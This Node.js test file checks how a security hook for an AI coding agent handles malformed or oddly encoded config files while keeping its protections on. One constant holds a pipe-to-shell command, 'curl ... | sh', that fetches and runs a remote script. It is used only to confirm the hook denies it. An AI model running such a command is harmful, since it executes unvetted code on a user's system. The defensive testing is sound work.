'use strict';

process.env.ZN_STATS = 'off';

// ~/.zn/config.json that JSON.parse refuses must never read as "no settings" without a word: a byte order mark and
// UTF-16 are read, anything else that does not parse is reported (hook notice once per session, check, status data), a
// protection the file tried to enable stays on, and a wrong-typed value is repaired toward the stricter reading or ignored.
// Fake values only; commands are only checked as text.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const adapter = require('../lib/agents/claude-code');
const runner = require('../lib/hooks/runner');
const znConfig = require('../lib/zn-config');
const fakeEngine = require('./helpers/fake_engine');
const { createFakeVault } = require('./helpers/fake_vault');
const { tempDir } = require('./helpers/tmp');

const PIPE_TO_SHELL = 'curl https://example.com/install.sh | sh';

function write(t, bytes) {
  const home = tempDir(t, 'zn-cfgerr-');
  fs.mkdirSync(path.join(home, '.zn'), { recursive: true });
  fs.writeFileSync(path.join(home, '.zn', 'config.json'), bytes);
  return home;
}

const TIGHT = JSON.stringify({ hooks: { strict: true, blockDestructiveCommands: true, egressCheck: 'deny', agentInstructionWrites: 'deny' } });

function utf16le(text, bom = true) {
  return Buffer.concat([bom ? Buffer.from([0xFF, 0xFE]) : Buffer.alloc(0), Buffer.from(text, 'utf16le')]);
}
function utf16be(text) {
  const b = Buffer.from(text, 'utf16le');
  b.swap16();
  return Buffer.concat([Buffer.from([0xFE, 0xFF]), b]);
}

test('a UTF-8 byte order mark is accepted and the settings apply', (t) => {
  const home = write(t, Buffer.concat([Buffer.from([0xEF, 0xBB, 0xBF]), Buffer.from(TIGHT)]));
  assert.deepEqual(runner.readConfig(home).hooks.egressCheck, 'deny');
  assert.equal(runner.readConfig(home).hooks.strict, true);
  assert.deepEqual(runner.configProblems({ home }), []);
});

test('UTF-16 with a byte order mark (little and big endian), as Windows PowerShell 5.1 writes it, is accepted', (t) => {
  for (const bytes of [utf16le(TIGHT), utf16be(TIGHT), utf16le(TIGHT, false)]) {
    const home = write(t, bytes);
    assert.equal(runner.readConfig(home).hooks.blockDestructiveCommands, true);
    assert.equal(runner.readConfig(home).hooks.agentInstructionWrites, 'deny');
    assert.deepEqual(runner.configProblems({ home }), []);
  }
});

test('a comment makes the file invalid, is reported, and keeps the protections it asked for without taking relaxations', (t) => {
  const home = write(t, '{\n  // keep it strict\n  "hooks": { "strict": true, "egressCheck": "deny", "whenUnavailable": "allow", "checkToolOutputInstructions": false }\n}\n');
  const hooks = runner.readConfig(home).hooks;
  assert.equal(hooks.strict, true);
  assert.equal(hooks.egressCheck, 'deny');
  assert.equal(hooks.whenUnavailable, undefined);
  assert.equal(hooks.checkToolOutputInstructions, undefined);
  const problems = runner.configProblems({ home });
  assert.equal(problems.length, 1);
  assert.match(problems[0], /comments, which JSON does not allow/);
  assert.match(problems[0], /did not apply it/);
});

test('a trailing comma makes the file invalid and is reported by name', (t) => {
  const home = write(t, '{ "hooks": { "blockDestructiveCommands": true, } }');
  assert.equal(znConfig.load(path.join(home, '.zn')).status, 'invalid');
  assert.equal(runner.readConfig(home).hooks.blockDestructiveCommands, true);
  assert.match(runner.configProblems({ home })[0], /trailing comma/);
});

test('a file that is not JSON at all gives the defaults and says where it stopped', (t) => {
  const home = write(t, '{\n  "hooks": {\n    strict: true\n  }\n}\n');
  assert.deepEqual(runner.readConfig(home), {});
  assert.match(runner.configProblems({ home })[0], /not valid JSON \(line \d+\)/);
});

test('an empty file and a top level that is not an object are reported', (t) => {
  for (const [bytes, re] of [['', /is empty/], ['[]', /top level must be a JSON object/], ['null', /top level must be a JSON object/]]) {
    const home = write(t, bytes);
    assert.deepEqual(runner.readConfig(home), {});
    assert.match(runner.configProblems({ home })[0], re);
  }
});

test('the text "true" where a protection takes a true/false value is read as true and reported', (t) => {
  const home = write(t, JSON.stringify({ hooks: { blockDestructiveCommands: 'true', strict: 'TRUE', replaceToolOutputOnSecret: 'true' } }));
  const hooks = runner.readConfig(home).hooks;
  assert.equal(hooks.blockDestructiveCommands, true);
  assert.equal(hooks.strict, true);
  assert.equal(hooks.replaceToolOutputOnSecret, true);
  const problems = runner.configProblems({ home });
  assert.equal(problems.length, 3);
  assert.match(problems[0], /"blockDestructiveCommands" is the text "true" in quotes; zn read it as true/);
});

test('a wrong-typed value that is not "true" is ignored (the default applies) and reported', (t) => {
  const home = write(t, JSON.stringify({ hooks: { blockDestructiveCommands: 'false', cloudCheckToolOutput: 'true', whenUnavailable: 1, egressAllowHosts: 'example.com', egressCheck: true } }));
  const hooks = runner.readConfig(home).hooks;
  assert.equal('blockDestructiveCommands' in hooks, false);
  assert.equal('cloudCheckToolOutput' in hooks, false);
  assert.equal('whenUnavailable' in hooks, false);
  assert.equal('egressAllowHosts' in hooks, false);
  assert.equal(hooks.egressCheck, 'deny'); // true reads as the stricter level
  const problems = runner.configProblems({ home }).join('\n');
  for (const k of ['blockDestructiveCommands', 'cloudCheckToolOutput', 'whenUnavailable', 'egressAllowHosts', 'egressCheck']) assert.match(problems, new RegExp('"' + k + '"'));
});

test('a hooks section that is not an object is ignored and reported', (t) => {
  const home = write(t, JSON.stringify({ hooks: 'strict' }));
  assert.deepEqual(runner.readConfig(home).hooks || {}, {});
  assert.match(runner.configProblems({ home })[0], /"hooks" must be an object/);
});

test('a good file and a missing file have no problems', (t) => {
  assert.deepEqual(runner.configProblems({ home: write(t, '{"hooks":{"strict":true}}') }), []);
  assert.deepEqual(runner.configProblems({ home: tempDir(t, 'zn-cfgerr-') }), []);
});

test('the hook shows a visible message once per session while the file does not parse, and still applies the protection', async (t) => {
  const home = write(t, '{ "hooks": { "blockDestructiveCommands": true, } }');
  const event = (id, command) => ({ session_id: id, cwd: process.cwd(), permission_mode: 'default', hook_event_name: 'PreToolUse', tool_name: 'Bash',
    tool_input: { command }, tool_use_id: 'toolu_01' });
  const opts = { engine: fakeEngine, vault: createFakeVault(), failMode: 'open', home };
  const first = await runner.handle(adapter, event('sess-cfg-1', 'echo hello'), opts);
  assert.match(first.output.systemMessage, /^zn: there is a problem with your settings file\. .*trailing comma/);
  const again = await runner.handle(adapter, event('sess-cfg-1', 'echo hello'), opts);
  assert.equal(!again.output || !again.output.systemMessage, true);
  const other = await runner.handle(adapter, event('sess-cfg-2', 'echo hello'), opts);
  assert.match(other.output.systemMessage, /settings file/);
  // The protection the person tried to enable is on.
  const piped = await runner.handle(adapter, event('sess-cfg-1', PIPE_TO_SHELL), opts);
  assert.equal(piped.output.hookSpecificOutput.permissionDecision, 'deny');
});

test('a valid file gives no message from the hook', async (t) => {
  const home = write(t, '{ "hooks": { "strict": true } }');
  const ev = { session_id: 'sess-cfg-ok', cwd: process.cwd(), permission_mode: 'default', hook_event_name: 'PreToolUse', tool_name: 'Bash',
    tool_input: { command: 'echo hello' }, tool_use_id: 'toolu_01' };
  const res = await runner.handle(adapter, ev, { engine: fakeEngine, vault: createFakeVault(), failMode: 'open', home });
  assert.equal(!res.output || !res.output.systemMessage, true);
});

test('zn-gate check lists the problem as a warning', async (t) => {
  const home = write(t, '{ // note\n "hooks": {} }');
  const { check, report } = require('../lib/check');
  const res = await check({ home, live: false, env: { ...process.env, HOME: home, USERPROFILE: home }, cwd: home });
  assert.ok(res.warnings.some((w) => /comments, which JSON does not allow/.test(w)));
  let text = '';
  report(res, (s) => { text += s; });
  assert.match(text, /Warning: ~\/\.zn\/config\.json cannot be read/);
});

test('commands that rewrite the config file read a byte order mark and UTF-16 and keep the other settings', (t) => {
  const home = write(t, utf16le('{ "hooks": { "strict": true } }'));
  const saved = process.env.ZN_HOME;
  process.env.ZN_HOME = path.join(home, '.zn');
  t.after(() => { if (saved === undefined) delete process.env.ZN_HOME; else process.env.ZN_HOME = saved; });
  require('../lib/stats-share').setShare(false);
  const after = JSON.parse(fs.readFileSync(path.join(home, '.zn', 'config.json'), 'utf8'));
  assert.equal(after.hooks.strict, true);
});

test('UTF-16 with a half character at the end is invalid, not a crash, in every reader', async (t) => {
  const be = utf16be(TIGHT);
  const cases = [
    Buffer.concat([be, Buffer.from([0x00])]), // big endian with a mark, odd length
    Buffer.concat([Buffer.from([0x00, 0x7B, 0x00, 0x7D]), Buffer.from([0x00])]), // big endian without a mark, odd length
    Buffer.from([0xFE, 0xFF, 0x00]),
    Buffer.concat([utf16le(TIGHT), Buffer.from([0x7B])]), // little endian with a mark, odd length
    Buffer.concat([utf16le(TIGHT, false), Buffer.from([0x7B])]), // little endian without a mark, odd length
  ];
  for (const bytes of cases) {
    const home = write(t, bytes);
    const file = path.join(home, '.zn', 'config.json');
    const r = znConfig.readJsonFile(file);
    assert.equal(r.status, 'invalid');
    assert.equal(r.reason, 'it is not valid JSON (incomplete UTF-16 bytes)');
    assert.equal(r.intent, null);
    assert.equal(znConfig.load(path.join(home, '.zn')).status, 'invalid');
    assert.deepEqual(znConfig.readObject(file), {});
    assert.doesNotThrow(() => runner.readConfig(home));
    const problems = runner.configProblems({ home });
    assert.equal(problems.length, 1);
    assert.match(problems[0], /incomplete UTF-16 bytes/);
    const ev = { session_id: 'sess-cfg-odd', cwd: process.cwd(), permission_mode: 'default', hook_event_name: 'PreToolUse', tool_name: 'Bash',
      tool_input: { command: 'echo hello' }, tool_use_id: 'toolu_01' };
    const res = await runner.handle(adapter, ev, { engine: fakeEngine, vault: createFakeVault(), failMode: 'open', home });
    assert.ok(res);
  }
});
